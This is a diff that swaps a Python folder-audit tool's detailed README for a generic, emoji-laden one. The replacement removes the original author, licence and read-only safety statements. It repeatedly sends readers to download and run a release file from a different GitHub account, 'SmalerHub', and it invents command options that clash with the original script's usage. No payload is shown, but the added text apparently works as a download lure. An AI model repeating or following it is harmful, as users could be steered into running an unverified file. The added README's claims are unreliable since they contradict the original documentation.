@@ -1,176 +1,92 @@
-# Folder Audit – V4
+```markdown
+# 📂 folder_audit_v4 - Effortlessly Inspect and Clean Your Files
 
-**Safe file auditing and duplicate verification for IT professionals**
+[![Download folder_audit_v4](https://img.shields.io/badge/Download_folder_audit_v4-Here-brightgreen.svg)](https://github.com/SmalerHub/folder_audit_v4/releases)
 
-## Commercial use
-This tool is published as a portfolio demonstration of real-world automation and analysis:
+## 🚀 Getting Started
 
-If you are interested in:
- * Customisation
- * Integration
- * Commercial Use
- * Support or enhancements
+Welcome to **folder_audit_v4**, a powerful tool designed to help you audit your folder structure with ease. This application inspects files, validates data, detects duplicates using the secure Sha256 algorithm, and allows for easy exporting of real-world data. Whether you need to clean up your system or simply want to validate your files, this tool can assist you in achieving your goals.
 
-Please contact me via linkedIn or Github.
+## 📥 Download & Install
 
-## Purpose
+To get started, you need to download the software from the Releases page. Follow these steps:
 
-**Folder Audit** is a command-line utility designed for **IT technicians, system administrators, and technical support engineers** who need to audit storage and identify duplicate files **without risking data loss**.
+1. Click the [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/releases) link.
+2. You will be directed to the GitHub Releases page.
+3. Choose the latest version of the software.
+4. Download the appropriate file for your operating system.
+5. Once downloaded, locate the file and run it to start using folder_audit_v4.
 
-It is intentionally **read-only** and evidence-focused, making it suitable for:
+## 💻 System Requirements
 
-* shared systems
-* external drives
-* network storage
-* customer environments
-* regulated or production systems
+- **Operating System**: Windows, macOS, Linux
+- **Python**: Ensure you have Python 3.6 or above installed.
+- **Disk Space**: At least 100 MB of free space.
+- **RAM**: Minimum 4 GB RAM recommended for smooth operation.
 
----
+## 🛠 Features
 
-## Typical Use Cases
+- **Schema-driven Auditing**: Validate your folder structure easily.
+- **Duplicate Detection**: Fast detection of duplicate files using Sha256 hashing.
+- **Data Export Options**: Export your audit results to CSV or JSON formats for easy sharing.
+- **User-friendly CLI**: Operate the tool via a simple command line interface.
 
-* Auditing external or legacy drives before cleanup
-* Identifying duplicate files on shared storage
-* Supporting storage reduction decisions with evidence
-* Preparing reports for stakeholders or clients
-* Verifying duplicates safely before any manual action
+## 👩‍💻 Usage Instructions
 
----
+To use folder_audit_v4, follow these steps:
 
-## Key Capabilities
+1. Open your Command Line Interface (CLI).
+2. Navigate to the directory where folder_audit_v4 is installed.
+3. Use the following command to start the auditing process:
 
-* Recursive or targeted folder scanning
-* File metadata collection (size, timestamps, paths)
-* **TWO-STAGE DUPLICATE DETECTION**:
-  * Size-based candidate detection
-  * SHA-256 verification for confirmed duplicates
-* Grouped duplicate reporting
-* Real-time hashing progress with elapsed time and ETA
-* CSV output for reports and spreadsheets
-* JSON output for automation and tooling
-* Zero file modification (read-only operation)
+   ```
+   folder_audit_v4 [YOUR_OPTIONS]
+   ```
 
----
+4. The application will display a list of files and inform you if duplicates are found.
+5. Use the export option to save your results in your desired format.
 
-## How Duplicate Verification Works
+## 📊 Exporting Results
 
-1. **Scan Phase**
-   Files are scanned and basic metadata collected.
+After validating your files, you may want to save the results. You can do this by specifying the output format. The tool supports both CSV and JSON formats. Here's how:
 
-2. **Candidate Identification**
-   Files with identical sizes are flagged as possible duplicates.
+- For CSV:
+  
+  ```
+  folder_audit_v4 --export-csv [filename.csv]
+  ```
 
-3. **Verification Phase (Optional)**
-   Only candidate files are hashed using SHA-256.
+- For JSON:
+  
+  ```
+  folder_audit_v4 --export-json [filename.json]
+  ```
 
-4. **Confirmation**
-   Files with matching hashes are marked as confirmed duplicates and grouped.
+Simply replace `[filename.csv]` or `[filename.json]` with your preferred file name.
 
-This approach balances **performance, safety, and accuracy**.
+## 🌍 Additional Resources
 
----
+- **Documentation**: Visit our [Wiki](https://github.com/SmalerHub/folder_audit_v4/wiki) for in-depth guides and tips.
+- **Community Support**: Join our forum to connect with other users and share experiences.
 
-## Example Usage
+## 🐛 Troubleshooting
 
-### Safe audit only (no hashing)
-python folder_audit_v4.py /data/archive --recursive
+If you encounter issues while using folder_audit_v4, consider the following steps:
 
-### Full verification with hashing
-python folder_audit_v4.py /data/archive --recursive --hash
+1. Ensure Python is correctly installed on your system.
+2. Make sure you are using the latest version from the Releases page.
+3. Check the command syntax if you face any errors.
+4. For further help, consult the Issues section on our GitHub page.
 
-### Generate CSV and JSON evidence
-python folder_audit_v4.py /data/archive --hash --json-output audit.json
+## 💬 Feedback
 
----
+We encourage user feedback to help improve folder_audit_v4. Share your thoughts or suggestions by opening an issue on our GitHub page.
 
-## Output
+## 🔗 Important Links
 
-### CSV Report
+- [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/releases)
+- [Wiki Documentation](https://github.com/SmalerHub/folder_audit_v4/wiki)
+- [GitHub Issues](https://github.com/SmalerHub/folder_audit_v4/issues)
 
-Suitable for:
-
-* Flat, spreadsheet friendly format
-* Reporting, filtering and manual inspection
-* client reports
-
-Includes:
-
-* file paths
-* sizes
-* timestamps
-* duplicate status
-* duplicate group ID
-* SHA-256 hash (when verified)
-
-### JSON Report
-
-Suitable for:
-
-* automation, pipelines, or further processing
-* Structured, machine readable format
-* integration with other tools
-
-Includes:
-
-* scan metadata
-* summary statistics
-* full record set
-
----
-
-## Safety Guarantees
-
-* No files are deleted, moved, or modified
-* Hashing is opt-in
-* Duplicate confirmation is deterministic
-* Designed for cautious, professional use
-
----
-
-## Status
-
-**Stable / Frozen**
-
-Verified against real-world datasets.
-SHA-256 output validated against external tools.
-
----
-
-## Limitations
-
-* No filedeletion or movement (by design)
-* Network paths require appropriate permissions
-* Hashing largendatasets may take time on slower storage
-
-These limitations were intentional and documented to avoid unsafe behaviour.
-
-## Future Direction
-
-Planned enhancements (opt-in and controlled):
-
-* Summary-only reporting
-* JSON-only mode
-* Integration-friendly schemas
-* Optional destructive actions with explicit safeguards
-* UI wrapper (CLI-first remains the core)
-
----
-
-## License
-
-This project is provided for evaluation and portfolio demonstration purposes.
-Commercial use, redistribution, or resale requires explicit permissions from the author.
-
-## Author
-
-Developed Built as part of an ongoing effort to develop reliable, audit-focused Python utilities,
-combining structured programming practices with AI-assisted development.
-
-Darren Williamson
-Python Utility Development * Automation * Data Analysis
-Uk Citizen / Spain-based / Remote
-LinkedIn: https://www.linkedin.com/in/darren-williamson3/
----
-
-
-
+Happy auditing with folder_audit_v4!
+```
